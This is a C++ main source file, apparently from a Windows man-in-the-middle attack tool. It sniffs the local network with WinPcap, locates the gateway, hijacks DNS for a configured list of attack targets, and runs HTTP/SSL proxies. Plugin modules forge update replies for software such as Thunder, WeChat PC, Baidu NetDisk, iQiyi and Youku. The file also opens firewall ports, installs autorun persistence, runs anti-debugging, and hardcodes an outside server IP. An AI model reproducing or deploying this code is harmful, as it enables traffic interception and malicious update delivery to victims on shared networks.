#include "PreparePacket.h"
#include <algorithm>
#include <windows.h>
#include <winsock2.H>
#include <Iptypes.h >
#include <iphlpapi.h>
#include <string>
#include <iostream>
#include <vector>
#include <conio.h>
#include <DbgHelp.h>
#include <stdlib.h>
#include <string.h>
#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"

#include "attacker.h"
#include "Public.h"
#include "Packet.h"
#include "snifferpacket.h"
#include "NetCardInfo.h"
#include "Confiig.h"

#include "attack.h"
#include "ssl\\sslentry.h"
#include "winpcap.h"

#include "HttpUtils.h"
#include "cipher/CryptoUtils.h"
#include "ssl/WeixinAndroid.h"
#include "security.h"
#include "FileOper.h"
#include "informer.h"
#include "utils/Tools.h"
#include "cipher/RSA.h"
#include "dnsutils/DnsProxy.h"
#include "ssl/HttpProxyListener.h"
#include "ssl/SSLProxyListener.h"
#include "ssl/informerProc.h"
#include "ssl/baofeng.h"
#include "ssl/QQManager.h"
#include "ssl/QQAndroid.h"
#include "cipher/sha1.h"
#include "cipher/UrlCodec.h"
#include "cipher/Base64.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"./lib\\wpcap.lib")
#pragma comment(lib,"./lib\\zlib.lib")
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"kernel32.lib")

//全部使用openssl自带头文件和库，其他知名应用的libeay32.dll和ssleay32.dll
#pragma comment(lib,"./lib\\libcrypto.lib")
#pragma comment(lib,"./lib\\libssl.lib")
#pragma comment(lib,"./lib\\openssl.lib")


#include "support/aos_crc64.h"
#include "ssl/HuYaPlugin.h"
#include "ssl/YoukuPC.h"
#include "ssl/QQ.h"
#include "ssl/Plugin2345.h"
#include "ssl/aliProtect.h"
#include "ssl/qukan.h"
#include "gateWay/gateway.h"
#include "gateWay/gateway.h"
#include "DnsUtils/dnsUtils.h"
#include "Utils/basesocket.h"
#include "ssl/IqiyiPlugin.h"
#include "ssl/WpsPlugin.h"
#include "ssl/QQ.h"
#include "Utils/simpleJson.h"
#include "cipher/compression.h"
#include "ssl/baiduNetDisk.h"
#include "ssl/peanutShell.h"
#include "ssl/baiduNetDisk.h"
#include "ssl/WeixinPC.h"
#include "ssl/ThunderUpdate.h"

using namespace std;

int gAttackMode = 3;



void test() {

	int ret = 0;

	return;

	//ret = Compress::gzfile("config.ini", "test.zip");

// 	WSADATA	stWsa = { 0 };
// 	ret = WSAStartup(0x0202, &stWsa);
// 	ret = BaseSocket::connectServer(inet_addr("47.101.189.13"), 65534);
	FileOper::initKey();
	char data[0x8000];
	HTTPPROXYPARAM param = { 0 };
	lstrcpyA(param.username, "jy20200614");

	ThunderUpdate::replyThunder(data, 0x8000, (LPHTTPPROXYPARAM)&param);

	WeixinPC::sendWxPCUpdate(data, 0x8000, (LPSSLPROXYPARAM)&param);

	//string crc = CryptoUtils::FileCrc32("C:\\Users\\Administrator\\Downloads\\IQIYIsetup_update_202008171655.exe", 4, TRUE);

	PreparePacket *iqiyi = new PreparePacket();
	string result = iqiyi->prepareIqiyi(&param);

	YouKuPCPlugin::replyYoukuPlugin(data, 0x8000,(LPSSLPROXYPARAM) &param);

	//PeanutShell::replyPeanutShell(data, 0x8000,  &param);
	BaiduNetDisk::replyBaiduUpdateSSL(data, 0x8000, 0x1000, (LPSSLPROXYPARAM)&param);

	BaiduNetDisk::replyBaiduJson(data, 0x8000, 0x1000, &param);

// 
// 	WPSPlugin::sendWpsPcUpdate(data, 0x8000, param.username);
// 
// 	IqiyiPlugin::replyPcUpdate(data, 0x2000, 0x2000,&param);
// 
// 	char * filedata = 0;
// 	int filesize = 0;
// 	ret = FileOper::fileReader("qqbrowser-1.dat", &filedata, &filesize);
// 	string id = SimpleJson::getBaseValue(filedata, "CSoftID");
// 	int iid = atoi(id.c_str());
// 
// 	string hash = SimpleJson::getStrValue(filedata, "PatchHash");
	
	return;
}


int main(int argc,char ** argv)
{
#ifdef _DEBUG
	test();
#endif

	int	nRetCode = 0;
	char szout[1024];

	string username = "";
	string password = "";
	int netcard_selected = -1;
	if (argc >= 4)
	{
		username = argv[1];
		password = argv[2];
		netcard_selected = atoi(argv[3]);
	}

	HANDLE hMutext = (HANDLE)Public::checkInstanceExist();
	if (hMutext == FALSE)
	{
		printf("program has already be running\n");
		//getchar();
		exit(-1);
		return -1;
	}

	WSADATA	stWsa = { 0 };
	nRetCode = WSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (nRetCode)
	{
		printf("WSAStartup error code:%d\n", GetLastError());
		//getch();
		exit(-1);
		return -1;
	}

	string path = Public::getpath();
	SetCurrentDirectoryA(path.c_str());


	int winpcapDelay = 1;
	int opensslctrl = 0;
	unsigned long serverIP = 0;
	char szgwmac[64] = { 0 };
	string servername = "";
	vector<string> gDnsAttackList = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,&opensslctrl,&gAttackMode,
		szgwmac,servername);
	if (gDnsAttackList.size() == 0) {
		printf("parse config file:%s error\r\n",CONFIG_FILENAME);
		_getch();
		return -1;
	}
	else {
		int cnt = Config::parseDnsCfg(DNS_FILENAME, gDnsAttackList);
		printf("parse dns attack url count:%u\r\n", cnt);
	}

#ifndef _DEBUG
	DWORD debugThreadid = 0;
	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Security::antiDebug,
		0, STACK_SIZE_PARAM_IS_A_RESERVATION, &debugThreadid));

	nRetCode = Security::loginCheck(gAttackMode,username, password);
	if (nRetCode <= 0)
	{
		printf("username or password error\r\n");
		_getch();
		exit(-1);
		return FALSE;
	}
#endif

	unsigned long localIP = 0;
	unsigned long netmask = 0;
	unsigned long netgateIP = 0;
	unsigned char localMac[MAC_ADDRESS_SIZE] = { 0 };
	
	string adaptername = NetCardInfo::selectWeapon(&localIP,&netmask,&netgateIP,localMac, netcard_selected);
	if (adaptername == "")
	{
		printf("get netcard_selected error\r\n");
		_getch();
		return -1;
	}

#ifndef _DEBUG
	nRetCode = Tools::autorun(username, password, netcard_selected);
#endif

	string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + adaptername;
	pcap_t  *pcapt = Winpcap::init(devname, winpcapDelay, netmask);
	if (pcapt == 0)
	{
		printf("winpcap init error\r\n");
		_getch();
		return -1;
	}




	//vector，set，map这些容器的end()取出来的值实际上并不是最后一个值，而end的前一个才是最后一个值
	//需要用prev(xxx.end())，才能取出容器中最后一个元素
	auto iter = unique(gDnsAttackList.begin(), gDnsAttackList.end());
	gDnsAttackList.erase(iter, gDnsAttackList.end());

	vector<string> gHostAttackList = gDnsAttackList;
	gHostAttackList.push_back(HttpUtils::getIPstr(serverIP));
	gHostAttackList.push_back(HttpUtils::getIPstr(localIP));
	gHostAttackList.push_back("127.0.0.1");

	nRetCode = Config::shiftDnsFormat(gDnsAttackList);

	DnsUitls * dnsutils = new DnsUitls(gDnsAttackList);

	DWORD cmode = 0;
	HANDLE hc = GetStdHandle(STD_INPUT_HANDLE);
	nRetCode = GetConsoleMode(hc, &cmode);
	nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);


	printf("checking encryption files,please wait...\r\n");
	string pluginPath = Public::getPluginPath();
	nRetCode = FileOper::checkFileCryption(pluginPath);

	if (serverIP == 0xffffffff || serverIP == 0 || gAttackMode == 3)
	{
		serverIP = localIP;
		printf("set server ip:%s to local ip:%s\r\n", servername.c_str(), HttpUtils::getIPstr(localIP).c_str());
	}

	gLocalIPAddr = localIP;
	gServerIP = serverIP;
	gLocalPath = path;

	in_addr ia = { 0 };
	ia.S_un.S_addr = gLocalIPAddr;
	gstrLocalIP = inet_ntoa(ia);
	ia.S_un.S_addr = gServerIP;
	gstrServerIP = inet_ntoa(ia);
	HttpUtils::ipv4toipv6((unsigned char*)&gLocalIPAddr, gLocalIPAddrV6);

	if (gAttackMode == 2 || gAttackMode == 3 ) {

		nRetCode = Tools::openPortInFW(HTTP_PORT,"HTTP","TCP");
		nRetCode = Tools::openPortInFW(SSL_PORT, "SSL", "TCP");
		nRetCode = Tools::openPortInFW(INFORMER_PORT, "INFORMER", "TCP");

		nRetCode = SSLEntry::sslEntry(serverIP,localIP, path, opensslctrl, gDnsAttackList,gHostAttackList,gAttackMode);

		nRetCode = Tools::setNetworkParams();

		printf("server mode or test mode init ok\r\n");
	}


	//printf("set server ip:%s,attack ip:%s,default user:%s\r\n", servername.c_str(), HttpUtils::getIPstr(localIP).c_str(),G_USERNAME);
	//inet_ntoa返回一个字符指针，指向一块存储着点分格式IP地址的静态缓冲区（同一线程内共享此内存）

	if (gAttackMode == 1 || gAttackMode == 3 )
	{
		string userpluginPath = Public::getDefaultUserPluginPath();
		nRetCode = access(userpluginPath.c_str(), 0);
		if ( nRetCode )
		{
			wsprintfA(szout,"username:%s attack data not exist\r\n",G_USERNAME);
			printf(szout);
			_getch();
			exit(-1);
		}

		printf("attack mode init ok,device name:%s,netmask:%08x,speed:%d\r\n", devname.c_str(), netmask, winpcapDelay);

		printf("parsing gateway mac and ip,please wait...\r\n");
		Gateway *gateway = new Gateway(pcapt,serverIP,localIP,localMac);

		int totalpack = gateway->getGateWay();
// 		if (totalpack)
// 		{
// 			GATEWAYPARAM p = gateway->getGatewayParam();
// 			printf("get gate way mac:%s,packet count:%d,mac count:%d,source ip:%s\r\n",
// 				HttpUtils::getmac(p.mac.DstMAC).c_str(), p.cnt, gateway->mCnt, HttpUtils::getIPstr(p.ip.SrcIP).c_str());
// 		}
		
		nRetCode = SnifferPacket::peeping(pcapt,serverIP, localIP, userpluginPath, gAttackMode);

		pcap_close(pcapt);
	}
	else {
		//nRetCode = Tools::initException(hMutext, username, password, netcard_selected);
		printf("server ready to work");
		Sleep(-1);
	}
	
	return nRetCode;
}

/*
0000:0000:0000:0000:0000:0000:6a0e:90b3
6a0e 90b3
135.75.43.52 按十六进制算出即87.4B.2B.34，
而87.4B.2B.34串地址一组还是8位，所以需要两组v4地址合成v6地址，
再把前96位补零，它可以被转化为
0000:0000:0000:0000:0000:0000:874B:2B34或者::874B:2B34
*/

//cmd执行程序时容易卡住 取消快速编辑模式
//全局变量空间一般比较大，因此大小超过1M的变量尽量声明为全局变量或者静态变量。
//统计代码行数 ^b*[^:b#/]+.*$